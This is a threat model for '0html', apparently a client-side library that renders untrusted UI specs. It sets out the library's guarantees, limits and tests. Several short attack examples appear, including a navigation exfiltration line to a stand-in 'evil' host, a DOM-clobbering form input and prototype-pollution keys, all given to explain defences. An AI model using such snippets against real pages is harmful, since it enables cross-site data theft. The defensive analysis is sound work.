# 0html Threat Model (0html/1.1)

Formal security analysis of the 0html standard. Scope: the runtime (`0bind`)
and compiler (`0html`) as a client-side UI layer for single-file tools that
render **untrusted specs** (from files, URLs, or model output).

Audience: security reviewers and engagement leads. This states what 0html
guarantees, what it does not, and how each guarantee is enforced and tested.

---

## 1. Assets

| Asset | Why it matters |
|---|---|
| The DOM of the host tool | XSS here = code exec in the analyst's/operator's session |
| The JS execution context | any script injection pivots to full page control |
| `Object.prototype` | pollution corrupts every object app-wide |
| Availability of the tool | a hang/crash denies the operator their instrument |
| Operator trust in output | a tool that renders attacker HTML as UI is worse than none |

## 2. Trust boundaries

```
  ┌─ UNTRUSTED ─────────────┐        ┌─ TRUSTED ──────────────────┐
  │ spec JSON               │        │ handler registry (code)    │
  │  • from a file          │  ───▶  │ ALLOWED_TAGS (compile-time)│
  │  • from a URL           │ 0html  │ trustedGenerators allowlist│
  │  • from an LLM          │compiler│ the TT policy              │
  │ generator input strings │        │ the host page's CSP        │
  └─────────────────────────┘        └────────────────────────────┘
```

The compiler **is** the boundary. Everything left of it is assumed hostile.
Everything right is author-controlled and vouched-for.

## 3. Actors

- **A1 — Malicious spec author.** Controls the entire JSON spec (e.g. a UI
  layout shipped by an attacker, or an LLM coerced into emitting a spec).
- **A2 — Malicious data source.** Controls the *strings* a trusted generator
  processes (e.g. a malicious PDF's object names in 0scan), but not the spec
  structure.
- **A3 — Host-page attacker.** Has found some *other* injection on the page and
  is trying to pivot through 0html's sinks.

---

## 4. STRIDE analysis

### S — Spoofing
| Threat | Mitigation | Enforced by | Tested |
|---|---|---|---|
| Spec claims a handler that grants privilege | Handlers are looked up by exact string in a code-side registry; a spec can *name* but never *define* one | J4 | 0bind, 0html |
| Fake "trusted" HTML from an unvouched source | `html` renders only if its `from` generator is in the caller's `trustedGenerators` allowlist | J5 | 0html, 0scan |

### T — Tampering
| Threat | Mitigation | Enforced by | Tested |
|---|---|---|---|
| Spec injects markup via text | All string content becomes text nodes; markup is inert | I1 | 0bind, 0html |
| Spec pollutes `Object.prototype` | `__proto__`/`constructor`/`prototype` dropped in specs, attrs, `on`, and in the `fromJSON` reviver | J1 | 0html |
| Vendored bundle altered post-adoption | `0html.lock` pins the bundle SHA-256; `0html verify` is tamper-evident | CLI | tamper tests |
| Inline script edited, CSP left stale | `0html verify <file>` recomputes and compares the CSP hash | CLI | tamper tests |

### R — Repudiation
| Threat | Mitigation | Enforced by |
|---|---|---|
| "Which code can write raw HTML here?" | Every raw-HTML surface is `trust()` / `{$trust, from}` — `grep '"$trust"'` + `grep 'trust('` enumerates all of them, each labeled with its generator | I4, J5 |
| "Did the shipped bundle change?" | Lockfile records SHA-256 + versions + timestamp | CLI |

### I — Information disclosure
| Threat | Mitigation | Enforced by |
|---|---|---|
| Spec exfiltrates via `<img src>`/`<a href>` to attacker origin | URL-bearing attrs scheme-checked; but note: 0html does **not** restrict *which* http(s) host — see §6 (host CSP `connect-src`/`img-src` is the control) | I3 + host CSP |
| `javascript:` / `data:` URL leaks context | scheme allowlist drops them, incl. control-char obfuscation | I3 |

### D — Denial of service
| Threat | Mitigation | Enforced by | Tested |
|---|---|---|---|
| Deeply nested spec → stack overflow | `maxDepth` (default 64) → `RangeError` | J2 | 0html |
| Huge spec → memory/CPU exhaustion | `maxNodes` (default 10000) → `RangeError` | J2 | 0html |
| Handler throws → app breaks | dispatch wraps handlers in try/catch; one bad handler warns, doesn't crash | runtime | 0bind |
| Clobbered DOM accessor breaks the walk | I10: dispatch resolves hasAttribute/getAttribute/parentNode/nodeType off the **prototype chain**, not off the node, and bounds the walk at 512 hops. Without it, `<form><input name="hasAttribute">` threw *outside* the try/catch above, so a submit lost its preventDefault and really navigated | runtime | 0bind |

### E — Elevation of privilege
| Threat | Mitigation | Enforced by | Tested |
|---|---|---|---|
| Spec introduces executable code | No spec value is ever eval'd, `Function`'d, or written to a script sink; handler names are registry keys | J4 | all |
| Spec smuggles `<script>`/`<iframe>`/`<object>` | Tag allowlist; disallowed tags render inert `[data-0html-refused]` | J3 | 0html |
| Inline `on*` handler attribute | Refused at both the runtime (I2) and the JSON layer (J6) | I2, J6 | 0bind, 0html |
| Raw-HTML sink throws under TT enforce, tempting a bypass | Runtime routes through its own `'0html'` TT policy — the sink works, no bypass needed | J7 | 0bind-tt |

---

## 5. Guarantees (what a reviewer can rely on)

Under the invariants I1–I4 / J1–J7, for **any** spec — including one written
by an adversary — 0html guarantees:

- **G1** No spec can cause script execution. (E, S)
- **G2** No spec can inject an active HTML element (script/iframe/object/embed
  or any tag outside the allowlist). (E, T)
- **G3** No spec can attach an event handler that isn't already registered in
  code. (S, E)
- **G4** No spec can pollute `Object.prototype`. (T)
- **G5** No spec can produce a `javascript:`/`data:` URL sink. (I)
- **G6** No spec can exhaust the stack or unboundedly the heap via structure. (D)
- **G7** Raw HTML renders only from a caller-allowlisted generator, and only
  when the caller explicitly opts in per compile. (S, E)
- **G8** All of G1–G7 hold **under Trusted Types enforce mode**, not just
  without it. (E)
- **G9** (operational) A pinned tool is tamper-evident: bundle drift or a
  stale CSP hash fails `0html verify` with a non-zero exit. (T, R)

## 6. Non-guarantees (explicit limits — read these)

0html is a **rendering** trust boundary, not a total security system. It does
**not**:

- **N1 Sanitize inside trusted HTML.** `trust()` content is the *generator's*
  responsibility to escape. 0html verifies the generator is *allowlisted*, not
  that its output is clean. A buggy generator that forgets to escape is out of
  scope — audit the generator.
- **N2 Restrict outbound hosts.** A scheme-valid `https://evil.example` passes
  I3. Preventing exfiltration to arbitrary origins is the host page's CSP
  (`connect-src`, `img-src`) — pair 0html with the §10 CSP recipe.
- **N3 Sandbox CSS.** `style` is accepted only as a string; don't route
  untrusted values into it (CSS injection / data exfil via CSS is not blocked).
- **N4 Constrain handler behavior.** 0html guarantees a spec can't *add* a
  handler, not that your registered handlers are safe. What `save` does is your
  code's problem.
- **N5 Protect against a compromised bundle at runtime.** `verify` is a
  build/CI-time check. If an attacker can already modify the served bundle,
  you have a bigger breach; SRI on the served file is the runtime control.
- **N6 Replace platform hardening.** The library guarantees (J1–J6) are
  strongest when paired with the platform layer (TT enforce + hash-CSP +
  frame protection). Use the hardened starter.

## 6b. Layered hardening engine (0html/1.2) — additional non-guarantees

The layer engine (`0html-layers.cjs`) applies platform-layer hardening (L1–L5) to an
existing tool. Its explicit limits, from the engine security review
(`0html-security-review.md`):

- **N7 L4's default policy is a choke point, not a sanitizer.** TT enforce (L4) routes
  all HTML through the default `createHTML` (passthrough) and **blocks string→script**
  (createScript/createScriptURL throw). It does *not* sanitize HTML — the tool's own
  escaping still must. "TT enforce" here means one audit choke point + a script-sink
  block, not DOM-XSS immunity. For real sanitization use L7 (the JSON compiler) or plug in
  a sanitizing default policy.
- **N8 script-src fully hardened; style-src partially.** L2 drops `'unsafe-inline'` for scripts;
  **L8** does the same for `<style>` blocks (hash-pin), but **inline `style=` attributes still
  require `'unsafe-inline'`** — L8 blocks rather than break them. Move inline styles to
  `<style>`/classes to fully drop it. (CSS injection / CSS exfil — cf. N3.)
- **N9 connect-src ≠ all exfil.** L5 scopes fetch/XHR/WebSocket/beacon; it does **not**
  stop navigation exfil (`location = 'evil?'+data`) or `window.open`. Form exfil is
  covered by `form-action 'none'` (L1) — and as of v1.8.2 the L1 check verifies that directive's VALUE, not just its presence, so `form-action *` no longer certifies as conformant.
- **N10 The converter parses with a real scanner as of v1.9.x** (quote-aware, script/style/comment masked, differentially tested against `python3 html.parser`); it refuses to edit markup that does not tokenise. Still browser-verify converted output, and treat flagged (`return`-idiom) handlers as needing manual review. Handlers written as markup inside JS strings are deliberately NOT converted and are reported.
- **N11 The engine trusts its own markers.** On a file of untrusted provenance, a crafted
  `0html-layers` / `0html-handlers` marker can steer `unapply`; validate provenance.
- **N12 Conformance verifies a claim, not a floor** unless gated with `--require`. Bare
  `conformance` confirms *claimed* layers are intact; `conformance --require=<tier>`
  enforces a minimum. **CI must use `--require`.**

**External-resource integrity:** 0html hash-pins *inline* scripts (L2); for *external*
`<script>`/`<link>`, **`audit-sri`** recomputes and verifies their Subresource Integrity
hash and flags any without one (a tampered CDN/file runs with full privileges even under a
strict `script-src`). Run it in CI alongside `conformance`.

**Residual controls:** N7 → adopt L7 or a sanitizing policy; N8 → hash-pin/restrict
style-src (future layer); N9 → app-level navigation guards; N10 → browser-verify + refuse
unparseable tags; N12 → `conformance --require` in CI. The engine + registry
(`0html-layers.cjs`, `layers.json`) are pinned in `0html.lock` so `verify` covers the
toolchain, not just the bundle.

## 7. Residual risk & recommended pairing

| Residual (from §6) | Control |
|---|---|
| N2 exfiltration | host CSP `connect-src`/`img-src` allowlist |
| N3 CSS injection | never interpolate untrusted → `style`; scope styles |
| N5 served-bundle tamper | SRI hash on the `<script>` if bundle is external; or ship inline (single-file) + `0html verify` in CI |
| N1 generator bug | unit-test each `trustedGenerators` entry for escaping |

**Recommended deployment:** single-file tool built on `0html-starter.html`
(TT enforce + hash-CSP + frame-bust), bundle pinned via `0html pin`, `0html
verify` wired into CI. That configuration realizes G1–G9 with N2/N3/N5 covered
by the paired platform controls.

---

## 8. Test-to-threat traceability

Every guarantee maps to executable tests (123 assertions total):

| Guarantee | Test file(s) |
|---|---|
| G1, G2, G3, G5 | `0bind-test.cjs`, `0html-test.cjs` |
| G4 | `0html-test.cjs` (J1 + reviver) |
| G6 | `0html-test.cjs` (J2 depth/breadth bombs) |
| G7 | `0html-test.cjs` (J5 gates), `0scan-test.cjs` |
| G8 | `0bind-tt-test.cjs` (enforce-mode) |
| G9 | CLI tamper tests (bundle drift, stale CSP hash) |
| End-to-end, hostile real-world input | `0scan-test.cjs` (malicious PDF scan data) |

Run all: `./build.sh --test` (core + integration) plus `node 0html-cli.cjs
verify` (integrity).
